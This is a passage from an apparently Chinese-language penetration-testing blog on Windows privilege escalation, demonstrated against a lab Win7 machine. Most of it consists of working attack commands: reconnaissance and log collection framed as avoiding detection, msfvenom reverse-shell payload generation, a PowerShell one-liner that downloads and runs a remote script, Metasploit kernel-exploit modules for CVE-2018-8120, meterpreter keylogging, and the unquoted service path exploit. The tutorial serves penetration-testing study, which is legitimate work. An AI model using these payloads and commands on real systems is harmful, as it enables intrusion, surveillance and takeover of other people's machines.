<p>hostname或者echo %COMPUTERNAME%</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547395.png" alt></p>
<p>获取所属域信息：</p>
<blockquote>
<p>systeminfo</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547396.png" alt></p>
<p>从这个命令中不只是可以看到有关域名的信息，还有很多有用的信息，比如：开机时间、安装时间、补丁修补情况、系统版本等信息。</p>
<p>获取环境变量：</p>
<blockquote>
<p>set</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547397.png" alt></p>
<p>从环境变量中可以看出用户的一些常用软件、临时文件的目录以及与用户相关的一些信息。</p>
<h2 id="获取系统安装的软件信息">获取系统安装的软件信息</h2>
<p>通过获取软件安装信息，我们可以从中找出我们可以利用的软件，或者可以获取到进一步权限信息的软件，比如：securecrt、filezilla等软件。也可以大概了解系统的安全防护软件的情况。可以利用注册表来获取这些信息，命令如下：</p>
<p>导出注册表信息：</p>
<blockquote>
<p>reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall reg.txt</p>
</blockquote>
<p>匹配出注册表信息中的软件：</p>
<blockquote>
<p>find “DisplayName” reg.txt |find /V “ParentDisplayName” &gt; tmplist.txt</p>
</blockquote>
<p>获得最终结果：</p>
<blockquote>
<p>for /f “tokens=2,3 delims==” %%a in (tmplist.txt) do (echo %%a &gt;&gt; software.txt)</p>
</blockquote>
<p>最终结果截取部分内容如图（网上扒的）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547398.png" alt></p>
<h2 id="获取系统补丁情况">获取系统补丁情况</h2>
<p>获取补丁修补信息可以在我们进行提权操作的时候起到指导性的作用，根据其补丁情况来使用exp溢出提权。虽然前面的systeminfo命令可以获取补丁的情况，但是其获取的内容不是很完整，只能看到补丁的编号，下面这条命令可以获取完整的补丁信息。</p>
<blockquote>
<p>wmic qfe list</p>
</blockquote>
<p>wmic是一个非常强大的工具，可以做很多事情，在渗透测试中有很多机会使用它。部分截图如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547399.png" alt></p>
<h2 id="获取系统注册的服务信息">获取系统注册的服务信息</h2>
<p>从服务信息中可以看出本系统提供哪些服务，针对不同的服务器有不同的利用方式。命令如下：</p>
<blockquote>
<p>sc query state= all</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547400.png" alt></p>
<h2 id="获取在线主机信息">获取在线主机信息</h2>
<p>通常我们获取在线主机的方式是扫描IP段，在域的内网中我们可以通过一条命令获取主机在同一网段或者有联系的主机列表，命令如下：</p>
<blockquote>
<p>net view</p>
</blockquote>
<p>由于本地没有域环境，因此上述命令会报错</p>
<h2 id="收集本地用户和组信息">收集本地用户和组信息</h2>
<p>这个在内网渗透测试中至关重要，这是在任何一台Windows主机上都要执行的命令，这个命令的作用包括：判断主机是否正在域中、主机管理员组是什么、本地管理员用户有哪些等等。</p>
<p>获取本地用户组：</p>
<blockquote>
<p>net localgroup</p>
</blockquote>
<p>获取本地用户：</p>
<blockquote>
<p>net user</p>
</blockquote>
<p>获取本地管理员信息：</p>
<blockquote>
<p>net localgroup administrators</p>
</blockquote>
<h2 id="获取本地共享信息">获取本地共享信息</h2>
<p>本地共享目录也是我们需要关注的目录，这里面可能会有很多对我们提升权限有帮助的重要文件。命令如下：</p>
<blockquote>
<p>net view /a %COMPUTERNAME%</p>
</blockquote>
<p>网上扒一个图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547401.png" alt></p>
<h2 id="获取ip信息">获取IP信息</h2>
<p>其实这个命令是一开始就应该执行的，从这个命令结果中可以大概看出内网的网络环境、dns服务器IP、域名信息等，命令如下：</p>
<blockquote>
<p>ipconfig /all</p>
</blockquote>
<h2 id="获取本地端口开放与连接信息">获取本地端口开放与连接信息</h2>
<p>这里可以看出本地系统开放了哪些端口，大概看出提供哪些服务以及有哪些内网主机与本机进行数据交流，这里也可以看出一些内网中存活的主机列表。命令如下：</p>
<blockquote>
<p>netstat -ano</p>
</blockquote>
<p>部分结果如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547402.png" alt></p>
<h2 id="查看本地的计划任务">查看本地的计划任务</h2>
<p>从计划任务中我们可以了解，这台主机每天做哪些任务，或者当前用户经常做哪些操作，甚至可以通过计划任务信息，可以获取到用户另外的帐号密码信息。命令如下：</p>
<blockquote>
<p>at或schtask</p>
</blockquote>
<p>这两条命令必须在系统权限下才可以执行，否则会提示拒绝访问。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547403.png" alt></p>
<h2 id="列出iis的站点">列出iis的站点</h2>
<p>在安装了iis服务的系统上，我们可以执行以下命令来获取站点信息：</p>
<blockquote>
<p>%windir%\system32\inetsrv\AppCmd.exe list site</p>
</blockquote>
<h2 id="保存系统上所有注册表信息">保存系统上所有注册表信息</h2>
<p>这几个命令比较暴力，有时候我们需要多次查询注册表信息，这样就需要执行很多条命令，我们可以把系统的所有注册表信息dump下来，本地分析，可以尽量减少执行命令的次数，减少日志量，减少被发现的几率：</p>
<pre><code class="hljs scss">reg export HKLM hklm<span class="hljs-selector-class">.reg</span>
reg export HKCU hkcu<span class="hljs-selector-class">.reg</span>
reg export HKCU hkcr<span class="hljs-selector-class">.reg</span>
reg export HKCU hku<span class="hljs-selector-class">.reg</span>
reg export HKCU hkcc<span class="hljs-selector-class">.reg</span></code></pre>
<h2 id="获取系统日志信息">获取系统日志信息</h2>
<p>日志信息不管在任何系统上都是非常重要的，所以在Windows信息收集方面，收集日志信息是必不可少的操作，获取日志的方式有两种，一种是可以将系统的日志复制回本地分析，一种是使用Windows官方的工具将日志导出然后保存到本地。</p>
<p>复制日志文件：</p>
<pre><code class="hljs scss">copy C:\Windows\System32\winevt\Logs\System.evtx
copy C:\Windows\System32\winevt\Logs\security.evtx
copy C:\Windows\System32\winevt\Logs\application.evtx</code></pre>
<p>使用工具导出：</p>
<pre><code class="hljs scss">..\psloglist -x system &gt; system<span class="hljs-selector-class">.log</span>
..\psloglist -x security &gt; security<span class="hljs-selector-class">.log</span>
..\psloglist -x application &gt; application<span class="hljs-selector-class">.log</span></code></pre>
<h1 id="0x03-系统内核溢出漏洞提权">0x03 系统内核溢出漏洞提权</h1>
<blockquote>
<p>Windows内核溢出漏洞提权通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限<br>
本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。<br>
github上windows系统溢出漏洞提权的汇总：<br>
<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
</blockquote>
<p>实战中最常用的本地溢出提权有 CVE-2018-8120、MS16-032、MS15-051 和 MS14-058 。<br>
在MSF中，最常用的提权模块是CVE-2018-8120；<br>
在CobaltStrike中，最常用的提权模块的是 MS14-058。这四个提权，都有对应的exe程序。exe程序均支持32和64位的机器。</p>
<h2 id="手动查找系统潜在漏洞">手动查找系统潜在漏洞</h2>
<p>获取目标主机的一个普通用户的shell后，执行如下命令，查看目标系统上安装了那些补丁：</p>
<pre><code class="hljs scss">systeminfo
or
wmic qfe get <span class="hljs-selector-tag">caption</span>,description,hotfixid,installedon
or
wmic qfe get <span class="hljs-selector-tag">Caption</span>,Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">"KB4131188"</span> 
// 直接找是否存在cve-<span class="hljs-number">2018</span>-<span class="hljs-number">8120</span>对应的KB4131188补丁</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547404.png" alt></p>
<p>可以看到系统就装了这几个补丁。攻击者会通过没有列出的补丁号，寻找相应的提权EXP，例如KiTrap0D和KB979682对应、MS10-021和KB979683对应等等。然后使用目标机上没有的安装的补丁号对应的EXP进行提权。Windows不同系统提权的漏洞和相应的补丁请见：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8">点我呀</a>。</p>
<blockquote>
<p>WMIC是Windows Management Instrumentation Command-line的简称，它是一款命令行管理工具，提供了从命令行接口到批命令脚本执行系统管理的支持，可以说是Windows平台下最有用的命令行工具。使用WMIC，我们不但可以管理本地计算机，还可以管理统一局域网内的所有远程计算机（需要必要的权限），而被管理的计算机不必事先安装WMIC</p>
</blockquote>
<h2 id="自动查找系统潜在漏洞">自动查找系统潜在漏洞</h2>
<h4 id="windows-exploit-suggester">Windows Exploit Suggester</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
<p>该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而且其只需要我们给出目标系统的信息即可。</p>
<p>使用如下：</p>
<p>首先更新漏洞数据库，会生成一个xls的文件，如下 2023-09-20-mssb.xls</p>
<p>这里有个小问题，首先下载好zip更新了数据库之后，需要安装一个依赖，依赖项目中有说明，之后更新数据库按理来说，更新的文件后缀应为xls，可我这里是xlsx，如果直接用xlsx则会报错（以上是我在虚拟机的情况），我们可以在本地更新后打开另存为xls，具体呢推荐如下图所示的格式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547405.png" alt></p>
<p>其他形式还未尝试，大家感兴趣可以测试。注意必须为python2环境</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547406.png" alt></p>
<p>然后执行如下命令，查看目标主机系统信息，保存为sysinfo.txt文件：</p>
<pre><code class="hljs scss">systeminfo &gt; sysinfo<span class="hljs-selector-class">.txt</span></code></pre>
<p>最后，运行如下命令，查看该系统是否存在可利用的提权漏洞：</p>
<pre><code class="hljs scss">python2 windows-exploit-suggester<span class="hljs-selector-class">.py</span> -d <span class="hljs-number">2020</span>-<span class="hljs-number">08</span>-<span class="hljs-number">20</span>-mssb<span class="hljs-selector-class">.xls</span> -<span class="hljs-selector-tag">i</span> sysinfo<span class="hljs-selector-class">.txt</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547407.png" alt></p>
<p>如上图，执行后，给出了一些目标系统存在的漏洞</p>
<h3 id="local_exploit_suggester-模块">local_exploit_suggester 模块</h3>
<p>Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。</p>
<p>使用如下，假设我们已经获得了目标主机的一个session：</p>
<pre><code class="hljs scss">use post/multi/recon/local_exploit_suggester 
set session <span class="hljs-number">1</span>
exploit</code></pre>
<p>这里我就搜了篇文章，对win7靶机获取一下其session</p>
<pre><code class="hljs scss">所需环境：<span class="hljs-number">1</span><span class="hljs-selector-class">.kali</span> Linux（攻击机） <span class="hljs-number">2</span><span class="hljs-selector-class">.windows7</span>（靶机）</code></pre>
<pre><code class="hljs SCSS">在kali终端中打开msfconsole控制台
开启监听
use exploit/multi/handler
设置tcp监听
set payload windows/meterpreter/reverse_tcp</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547408.png" alt></p>
<p><strong>Linux：</strong><br>
<code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf &gt; shell.elf</code></p>
<p><strong>Windows:</strong></p>
<pre><code class="hljs scss"><span class="hljs-number">32</span> 位：msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp lhost= lport= -f exe &gt; shell<span class="hljs-selector-class">.exe</span>

<span class="hljs-number">64</span> 位：msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span><span class="hljs-selector-class">.17</span><span class="hljs-selector-class">.128</span> lport=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">a</span> x64 -f exe &gt; shell<span class="hljs-selector-class">.exe</span></code></pre>
<pre><code class="hljs scss">说明：-<span class="hljs-selector-tag">p</span> <span class="hljs-built_in">payload</span>(有效载荷) 通俗的讲payload是用来建立目标机与攻击机稳定连接的，可以返回shell
-e 编码方式
-<span class="hljs-selector-tag">i</span> 编码次数
-<span class="hljs-selector-tag">b</span> 在生成的程序中避免出现的值
-f exe 生成exe格式</code></pre>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span><span class="hljs-selector-class">.17</span><span class="hljs-selector-class">.137</span> lport=<span class="hljs-number">4444</span> -f exe &gt; shell<span class="hljs-selector-class">.exe</span></code></pre>
<p>不过操作下来，发现没必要非得写64位对应的命令，反而这个命令还报错，不知是否为我的失误</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547409.png" alt></p>
<p>将该shell文件上传到靶机中。在kali控制台下使用python 环境执行命令：python -m SimpleHTTPServer 800搭建一个http服务，提供一个web页面供靶机浏览。(一定是在管理员模式下执行此命令 (sudo su))</p>
<p>不过这里不用搞800,默认端口即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547410.png" alt></p>
<p>值得注意的是python2才可以，打开目标机win7，输入地址进行下载木马并保存在桌面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547411.png" alt></p>
<p>上图为下载的回显，返回第二步界面，设置监听主机，运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547412.png" alt></p>
<p>可以看到得到了session，查看session，如果此时是meterpreter，输入background即可返回msf exploit(multi/handler)</p>
<pre><code class="hljs cs">查看系统信息:sysinfo
截取时下桌面:screenshot</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547413.png" alt></p>
<p>捕获击键记录:keyscan start<br>
控制键盘鼠标 启用/禁用:uictl enable/disable keyboard</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44286136/article/details/115865976">msf 获取一个普通的session 控制windows</a></p>
<pre><code class="hljs scss">use post/multi/recon/local_exploit_suggester 
set session <span class="hljs-number">1</span>
exploit</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547414.png" alt></p>
<p>这里也是发现了二十几个，该模块快速识别并列出了系统中可能被利用的漏洞，十分方便。但虽然如此，也并非所有列出的local exploits都可用。</p>
<h3 id="enum_patches-模块">enum_patches 模块</h3>
<p>会用metasploit中的post/windows/gather/enum_patches模块可以根据漏洞编号快速找出系统中缺少的补丁。使用如下：</p>
<pre><code class="hljs scss">use post/windows/gather/enum_patches
set session <span class="hljs-number">1</span>
exploit</code></pre>
<p>这里直接贴一个网上的图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547415.png" alt></p>
<p>在实际的查找潜在漏洞的过程中，建议手动和自动双管齐下。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>该脚本可以快速的查找出可能用于本地权限提升的漏洞。使用如下：</p>
<pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://ip/Sherlock.ps1'</span>);      // 远程执行

<span class="hljs-comment">#导入模块</span>
<span class="hljs-built_in">Import-Module</span> .\Sherlock.ps1
<span class="hljs-comment">#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码</span>
<span class="hljs-built_in">Set-ExecutionPolicy</span> Unrestricted
<span class="hljs-comment">#输入如下命令可以查看帮助信息</span>
powercat <span class="hljs-literal">-h</span>

<span class="hljs-built_in">Find-AllVulns</span>    // 调用脚本后，执行搜索命令</code></pre>
<p>这里总是报错，我就下载到本地了，这里搜索的时间较长，耐心等待</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547416.png" alt></p>
<p>另外还找到一个模块：<code>post/windows/gather/enum_applications</code>&nbsp;查看系统可能存在的可以利用的漏洞（贴个图）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547417.png" alt></p>
<h2 id="选择漏洞并利用">选择漏洞并利用</h2>
<p>查找了目标机器上的补丁并确定存在漏洞后，我们就可以对目标机器上传本地溢出程序，并执行。这里，我们选择的是CVE-2018-8120。</p>
<p>漏洞利用程序可以从以下几个地址中下载：（里面附有使用说明）</p>
<ul>
<li>Windows 下的提权大合集：<a target="_blank" rel="noopener" href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></li>
<li>Windows内核溢出漏洞提权大全：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
<li>各大平台提权工具：<a target="_blank" rel="noopener" href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547418.png" alt></p>
<p>这里下载的时候注意将exe文件放入相应目录在执行如上命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547419.png" alt></p>
<p>如上图，再执行提权程序之前，为普通用户whoami权限，执行后为system权限。msfconsole上完整操作如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547420.png" alt></p>
<p>但我这里似乎没成功，另外这个cve也可以直接使用msf的模块</p>
<blockquote>
<p>use exploit/windows/local/ms18_8120_win32k_privesc</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547421.png" alt></p>
<p>设置session之后运行即可，如下图可以看到成功提权</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547422.png" alt></p>
<h1 id="0x04-系统错误配置漏洞提权">0x04 系统错误配置漏洞提权</h1>
<p>在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但是如果碰到无法通过系统内核溢出漏洞提权的情况时，会可以利用系统中的错误配置漏洞来提权。下面演示几种常见的Windows系统错误配置漏洞提权方法。</p>
<h2 id="可信任服务路径漏洞">可信任服务路径漏洞</h2>
<p>Trusted Service Paths 漏洞是由系统中的“CreateProcess”函数引起的，并利用了windows文件路径解析的特性。</p>
<p>首先，我们来认识一下Windows中文件路径解析的特性。例如，我们有一个文件路径为<code>C:\Program Files\Some Folder\Service.exe</code>。那么，对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。如上面的目录为例，Windows会依次尝试确定和执行以下程序：</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>. C:\Program.exe
<span class="hljs-number">2</span>. C:\Program Files\Some.exe
<span class="hljs-number">3</span>. C:\Program Files\Some Folder\Service.exe</code></pre>
<p>可见，最后才确定并执行真正的程序Service.exe。而由于Windows服务通常是以system权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以system系统权限进行，那么，如果我们将一个“适当命名”的可执行程序上传到以上所说的受影响的目录中，服务一旦启动或重启，该程序就会以system权限运行了，可见该漏洞利用了服务路径的文件/文件夹的权限。</p>
<p>该漏洞是由于一个服务的可执行文件没有正确的处理所引用的完整路径名，即一个服务的可执行文件的完整路径中含有空格且没有被双引号引起来，那么该服务就存在这个漏洞。下面演示该漏洞利用方法。</p>
<p>首先，我们可以用以下命令列出目标主机中所有存在空格且没有被引号括起来服务路径：</p>
<pre><code class="hljs scss">wmic service get name,displayname,pathname,startmode|findstr /<span class="hljs-selector-tag">i</span> "Auto" |findstr /<span class="hljs-selector-tag">i</span> /v "C:\Windows\\<span class="hljs-string">" |findstr/i /v "</span><span class="hljs-string">""</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547423.png" alt></p>
<p>如上图，可以看到“whoami”和“Bunny”这两个服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，我们需要确定我们对目标文件夹是否有写入的权限。</p>
<p>这里我们使用Windows中的icacls命令，依次来检查<code>C:\</code>、<code>C:\Program Files\Program Folder</code>等目录的权限发现只有<code>C:\Program Files\program folder</code>目录有Everyone(OI)(CI)(F)：</p>
<p>参数说明：</p>
<blockquote>
<ul>
<li>“M”表示修改</li>
<li>“F”代表完全控制</li>
<li>“CI”代表从属容器将继承访问控制项</li>
<li>“OI”代表从属文件将继承访问控制项。</li>
</ul>
</blockquote>
<p>这就意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547424.png" alt></p>
<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务。</p>
<pre><code class="hljs scss">sc stop &lt;service_name&gt;
sc start &lt;service_name&gt;</code></pre>
<p>我们生成一个msf马并重命名为Hello.exe上传到该<code>C:\Program Files\Program Folder</code>目录下，然后分别执行如下命令重启该WhoamiTest服务：</p>
<pre><code class="hljs scss">sc stop WhomaiTest
sc start WhomaiTest</code></pre>
<p>如下图完整利用过程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547425.png" alt></p>
<p>可知提权前为管理员权限（liukaifeng01），提权成功后我们得到一个system权限的session。</p>
<p>这里要注意，新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate -f”命令即可实现自动迁移进程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547426.png" alt></p>
<p>该提权方法在metasploit中对应的模块为：<code>exploit/windows/local/unquoted_service_path</code>，使用如下：</p>
<p>（在之前的metasploit中为exploit/windows/local/trusted_service_path，但在新版的metasploit中替换替换成了exploit/windows/local/unquoted_service_path）</p>
<pre><code class="hljs scss">use exploit/windows/local/unquoted_service_path
set session <span class="hljs-number">1</span>
set AutoRunScript migrate -f
exploit</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547427.png" alt></p>
<h2 id="错误权限配置漏洞">错误权限配置漏洞</h2>
